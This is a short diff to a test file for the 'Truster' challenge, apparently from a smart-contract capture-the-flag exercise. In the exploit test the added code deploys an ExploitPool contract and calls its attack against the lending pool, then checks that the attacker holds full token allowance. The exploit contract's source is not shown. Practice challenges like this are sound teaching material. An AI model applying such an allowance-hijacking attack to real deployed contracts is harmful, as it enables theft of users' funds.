@@ -29,6 +29,17 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const ExploitPool = await ethers.getContractFactory('ExploitPool', deployer ); 
+        this.exploit = await ExploitPool.deploy(); 
+
+        await this.exploit.connect(attacker).attack(
+            this.pool.address, 
+            this.token.address
+        )
+// checking the allowance is 100%
+parseFloat(await this.token.allowance(this.pool.address, attacker.address))
+        // expect(await this.token.allowance(this.pool.address, attacker.address)).to.equal(await this.token.balanceOf(this.pool.address))
+
     });
 
     after(async function () {
